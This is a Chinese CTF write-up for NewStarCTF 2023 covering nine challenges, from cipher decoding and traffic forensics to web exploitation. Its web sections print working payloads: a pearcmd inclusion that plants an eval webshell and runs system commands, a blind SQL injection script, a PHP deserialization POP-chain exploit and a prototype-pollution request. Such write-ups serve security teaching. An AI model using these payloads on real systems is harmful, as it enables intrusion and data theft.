# 原创
：  2023NewStarCTF

# 2023NewStarCTF

**目录**

[一、阳光开朗大男孩](#%E4%B8%80%E3%80%81%E9%98%B3%E5%85%89%E5%BC%80%E6%9C%97%E5%A4%A7%E7%94%B7%E5%AD%A9)

[二、大怨种](#%E4%BA%8C%E3%80%81%E5%A4%A7%E6%80%A8%E7%A7%8D)

[三、2-分析](#%E4%B8%89%E3%80%812-%E5%88%86%E6%9E%90)

[四、键盘侠](#%E5%9B%9B%E3%80%81%E9%94%AE%E7%9B%98%E4%BE%A0)

[五、滴滴滴](#%E4%BA%94%E3%80%81%E6%BB%B4%E6%BB%B4%E6%BB%B4)

[六、Include?](#%E5%85%AD%E3%80%81Include%3F)

[七、medium_sql](#%E4%B8%83%E3%80%81medium_sql)

[八、POP Gadget](#%E5%85%AB%E3%80%81POP%20Gadget)

[九、OtenkiGirl](#%E4%B9%9D%E3%80%81OtenkiGirl)

---


### 一、阳光开朗大男孩

1.题目给出了secret.txt和flag.txt两个文件，secret.txt内容如下：

```
法治自由公正爱国公正敬业法治和谐平等友善敬业法治富强公正民主法治和谐法治和谐法治法治公正友善敬业法治文明公正自由平等诚信平等公正敬业法治和谐平等友善敬业法治和谐和谐富强和谐富强和谐富强平等友善敬业公正爱国和谐自由法治文明公正自由平等友善敬业法治富强和谐自由法治和谐法治和谐法治和谐法治法治和谐富强法治文明公正自由公正自由公正自由公正自由

```

在 http://www.atoolbox.net/Tool.php?Id=850 进行社会主义核心价值观解密后可以得到：

```
this_password_is_s000_h4rd_p4sssw0rdddd

```

得到一个Key，结合flag.txt中的emoji表情可以推断出flag.txt使用了emoji-AES加密。<br/>  

<br/> 在 https://aghorler.github.io/emoji-aes/ 进行emoji-AES解密，key为s000_h4rd_p4sssw0rdddd，得到Flag：

### 二、大怨种

1.题目给出gif图片，编写一个脚本提取出gif的每一帧图片：

```
from PIL import Image
import os

def extract_frames(gif_path, output_dir):    
    gif = Image.open(gif_path)    
    os.makedirs(output_dir, exist_ok=True)    
    try:        
        while True:            
            current_frame = gif.tell()            
            output_path = os.path.join(output_dir, f"frame_{current_frame}.png")                                         gif.save(output_path, "PNG")            
            gif.seek(current_frame + 1)    
        except EOFError:        
            pass    

        print("提取完成！")

gif_path = "1.gif"
output_dir = "./res/"
extract_frames(gif_path, output_dir)

```

其中有一帧图像是这样的：<br/>  

<br/> 是汉信码，可以在 https://tuzim.net/hxdecode/ 在线扫描，扫描后得到Flag：

### 三、2-分析

题目描述如下：<br/>  

<br/> 1.Flag由三个信息构成：登录用户名、存在漏洞的文件名、写入的WebShell文件名。<br/> 根据我们的常识，一般登录请求都是POST方式的请求，因此可以先过滤出所有的POST请求：

```
http &amp;&amp; http.request.method == POST

```

可以看到有一个发送给/api/action/login.php的POST请求中有username和password字段：<br/>  

<br/> 由此推断出登录的用户名为best_admin。<br/> 2.其次是存在漏洞的文件名和WebShell文件名，可以看到有大量的目录扫描流量，先使用WireShark过滤器过滤掉响应状态码为404的响应：

```
http &amp;&amp; http.response.code != 404

```

对剩下的流量进行分析，关注到1267号流量响应比较奇怪：<br/>  

<br/> 很明显存在WebShell，追踪该流。<br/>  

<br/> 由此可以得到剩下的两个信息，index.php文件的page参数存在任意文件包含漏洞，攻击者通过这个漏洞包含pearcmd.php向服务器中写入了名为wh1t3g0d.php的WebShell。<br/> 而后续的流量也可以看到攻击者是利用wh1t3g0d.php这个Shell执行了一些系统命令：<br/>  

<br/> 由此得到Flag明文：best_admin_index.php_wh1t3g0d.php<br/> 整体md5后包裹flag{}得到最终flag：flag{4069afd7089f7363198d899385ad688b}

### 四、键盘侠

1.打开题目发现是USB流量，结合题目名猜测是键盘流量，使用WireShark过滤器过滤出所有的键盘流量，然后导出保存为res.pcapng：

```
usb.src =="1.15.1"

```

使用tshark命令对流量数据进行提取并去除空行：

```
tshark -r res.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' &gt; usbdata.txt

```

导出后使用以下脚本进行按键信息提取：

```
normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"&lt;RET&gt;","29":"&lt;ESC&gt;","2a":"&lt;DEL&gt;", "2b":"t","2c":"&lt;SPACE&gt;","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"&lt;NON&gt;","33":";","34":"'","35":"&lt;GA&gt;","36":",","37":".","38":"/","39":"&lt;CAP&gt;","3a":"&lt;F1&gt;","3b":"&lt;F2&gt;", "3c":"&lt;F3&gt;","3d":"&lt;F4&gt;","3e":"&lt;F5&gt;","3f":"&lt;F6&gt;","40":"&lt;F7&gt;","41":"&lt;F8&gt;","42":"&lt;F9&gt;","43":"&lt;F10&gt;","44":"&lt;F11&gt;","45":"&lt;F12&gt;"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&amp;","25":"*","26":"(","27":")","28":"&lt;RET&gt;","29":"&lt;ESC&gt;","2a":"&lt;DEL&gt;", "2b":"t","2c":"&lt;SPACE&gt;","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"&lt;NON&gt;","33":"\"","34":":","35":"&lt;GA&gt;","36":"&lt;","37":"&gt;","38":"?","39":"&lt;CAP&gt;","3a":"&lt;F1&gt;","3b":"&lt;F2&gt;", "3c":"&lt;F3&gt;","3d":"&lt;F4&gt;","3e":"&lt;F5&gt;","3f":"&lt;F6&gt;","40":"&lt;F7&gt;","41":"&lt;F8&gt;","42":"&lt;F9&gt;","43":"&lt;F10&gt;","44":"&lt;F11&gt;","45":"&lt;F12&gt;"}
nums = []
keys = open('usbdata.txt')
for line in keys:
    if len(line)!=17:
        continue
    nums.append(line[0:2]+line[4:6])
keys.close()
output = ""
for n in nums:
    if n[2:4] == "00" :
        continue
    if n[2:4] in normalKeys:
        if n[0:2]=="02":
            output += shiftKeys [n[2:4]]
        else :
            output += normalKeys [n[2:4]]
    else:
        output += '[unknown]'
print('output :n' + output)

```

得到如下结果：

```
nw3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vvvvbaaaasffjjwwwwrrissgggjjaaasdddduuwwwwwwwwiiihhddddddgggjjjjjaa1112333888888&lt;ESC&gt;&lt;ESC&gt;2hhxgbffffbbbnnat&lt;CAP&gt;&lt;CAP&gt;ff&lt;DEL&gt;lll&lt;DEL&gt;&lt;DEL&gt;aaa&lt;DEL&gt;&lt;DEL&gt;gggg&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;{999&lt;DEL&gt;&lt;DEL&gt;999&lt;DEL&gt;&lt;DEL&gt;11&lt;DEL&gt;9aaa&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;eb2---&lt;DEL&gt;&lt;DEL&gt;a450---&lt;DEL&gt;&lt;DEL&gt;2f5f&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;--&lt;DEL&gt;7bfc[unknown][unknown][unknown]-8989&lt;DEL&gt;&lt;DEL&gt;dfdf&lt;DEL&gt;&lt;DEL&gt;4bfa4bfa&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;85848584}}}&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;}]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;nice&lt;SPACE&gt;work!1yyoou&lt;SPACE&gt;ggot&lt;SPACE&gt;tthhis&lt;SPACE&gt;fllag

```

\&lt;DEL\&gt;表示删除，\&lt;SPACE\&gt;表示空格，根据这个按键顺序对数据进行处理后得到flag：

```
flag{9919aeb2-a450-2f5f-7bfc-89df4bfa8584}

```

### 五、滴滴滴

1.题目给出一个wav文件和一个jpg文件，其中wav文件听起来像是拨号音，利用dtmf2num工具进行拨号音识别：<br/>  

<br/> 得到拨号音的内容为：

```
52563319066

```

结合题目简介的提示，这串数字应该是某处使用的密码，因此可以尝试steghide工具来对jpg图片进行隐写内容提取：<br/>  

<br/> 得到一个txt文件，打开即是Flag：

### 六、Include?

1.页面源代码如下。

```
&lt;?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];

        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?&gt;

```

题目过滤了常见的伪协议和日志文件，提示 Something in phpinfo.php!，所以先去访问phpinfo.php，payload如下：

```
?file=phpinfo

```

查找flag，发现fake{Check_register_argc_argv}。<br/>  

<br/> 查找register_argc_argv，发现为on。<br/>  

<br/> 结合标题?（pear），提示以及register_argc_argv为on，知道是要利用pearcmd文件包含达成rce。<br/> payload：

```
?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_REQUEST[8]);?&gt;+/tmp/cmd.php

```

<br/> 然后访问包含一句话木马的cmd.php文件，执行远程命令。

```
?file=/tmp/cmd&amp;8=system("ls+/");

```

```
?file=/tmp/cmd&amp;8=system("cat+/flag");

```

### 七、medium_sql

1.根据题目可以判断是sql注入，先按照常规的测试方法，判断出是个布尔盲注。

```
?id=TMP0919' And if(1&gt;0,1,0) --+
?id=TMP0919' And if(0&gt;1,1,0) --+

```

<br/>  

<br/> 发第一个，有回显，第二个，没回显，说明页面可以根据if判断的结果回显两种（真假）内容，因此是布尔盲注。<br/> 2.编写盲注脚本，用二分查找。

```
import requests
import time


def condition(res):
    if 'Physics' in res.text:
        return True
    return False


result = ''
_url = 'xxxxx'
for _time in range(1, 1000):
    print("time:%d" % _time)
    left = 32
    right = 128
    while right &gt; left:
        mid = (left + right) // 2
        # 获取当前库表名
        # url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))In({mid})),1,0)%23"
        # 获取字段名
        # url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))In({mid})),1,0)%23"
        # 获取字段值
        url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))In({mid})),1,0)%23"
        # 防止请求速率过快
        time.sleep(0.2)
        res = requests.get(url=url)
        if condition(res):
            result += chr(mid)
            print(result)
            break
        else:
            # 获取当前库表名
            # url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23"
            # 获取字段名
            # url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23"
            # 获取字段值
            url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23"
            res = requests.get(url=url)
            if (condition(res)):
                left = mid
            else:
                right = mid

```

### 八、POP Gadget

1.源代码如下。

```
&lt;?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this-&gt;name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}
class Then{
    private $func;

    public function __toString()
    {
        ($this-&gt;func)();
        return "Good Job!";
    }
}
class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this-&gt;obj-&gt;end();
    }
}
class Super{
    protected $obj;
    public function __invoke()
    {
        $this-&gt;obj-&gt;getStr();
    }
    public function end()
    {
        die("==GAME OVER==");
    }
}
class CTF{
    public $handle;

    public function end()
    {
        unset($this-&gt;handle-&gt;log);
    }
}
class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this-&gt;func)($this-&gt;var);    
    }
}
@unserialize($_POST['pop']);

```

2.题目主要考察POP链构造，整个链子比较简单。从Begin的__destruct析构函数作为起点开始，构造POP链触发到WhiteGod的__unset方法，__unset方法中存在一个函数的动态调用，可以实现RCE。<br/> POP Gadget如下：

```
Begin::__destruct -&gt; Then::__toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset

```

编写Exp如下：

```
&lt;?php
class Begin {
    public $name;
    public function __construct($a) {
        $this-&gt;name = $a;
    }
}
class Then {
    private $func;
    public function __construct($a) {
        $this-&gt;func= $a;
    }
}
class Handle {
    protected $obj;
    public function __construct($a) {
        $this-&gt;obj = $a;
    }
}
class Super {
    protected $obj;
    public function __construct($a) {
        $this-&gt;obj = $a;
    }
}
class CTF {
    public $handle;
    public function __construct($a) {
        $this-&gt;handle = $a;
    }
}
class WhiteGod {
    public $func;
    public $var;
    public function __construct($a, $b) {
        $this-&gt;func = $a;
        $this-&gt;var = $b;
    }
}
// POP Gadget: 
// Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset
$obj = new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod("readfile","/flag"))))));
echo urlencode(serialize($obj));

```

需要注意的是一些类中有保护或私有属性的成员，因此需要对序列化数据进行URL编码，得到：

```
O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A8%3A%22readfile%22%3Bs%3A3%3A%22var%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D%7D%7D%7D%7D

```

### 九、OtenkiGirl

1.随便提交一些信息，通过抓包或者直接查看附件的源码都能发现下面两个请求地址：<br/> 第一个：获取全部信息（可以改变0的值就是获取到指定时间戳之后的信息）<br/>  

<br/>  

<br/> 第二个：提交信息<br/>  

<br/> 提交信息必须为 JSON 格式contact和reason字段是必须的，例如

```
POST /submit HTTP/1.1
Content-Type: application/json

{  "contact": "test",  "reason": "test"}

```

查看routes/info.js源码，考察从数据库中获取数据的函数getInfo<br/>  

<br/> 其中第4行和第5行将我们传入的`timestamp`做了一个过滤，使得所返回的数据不早于配置文件中的`min_public_time`<br/> 查看根目录下的`config.js`和`config.default.js`后发现`config.js`并没有配置`min_public_time`，因此`getInfo`的第5行只是采用了`DEFAULT_CONFIG.min_public_time`<br/> 考虑原型链污染污染`min_public_time`为我们想要的日期，就能绕过最早时间限制，获取任意时间的数据<br/> 查看`routes/submit.js`源码，发现注入点<br/>  

<br/> 其中`merge`函数第7行存在原型链污染，因此只要考虑注入`data['__proto__']['min_public_time']`的值即可<br/> 于是构造`payload`

```
POST /submit HTTP/1.1
Content-Type: application/json

{  "contact": "test",  "reason": "test",  "__proto__": {    "min_public_time": "1001-01-01"  }}

```

<br/> 然后为我们再请求`/info/0`，就能得到更多的数据，得到flag。

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/25c61ac90c204ee59825fe6c3a48b0d0.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/5b367a3895674f25b79c177b0612178f.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/310dad32ffad47cf8c913e7d53b82283.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/cc4ab58d9b9945f49b0415a33da6547c.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/1477a1b3af5545f2a914b3341a69a1cd.png" width="665"/>

应急响应笔记

学习路线
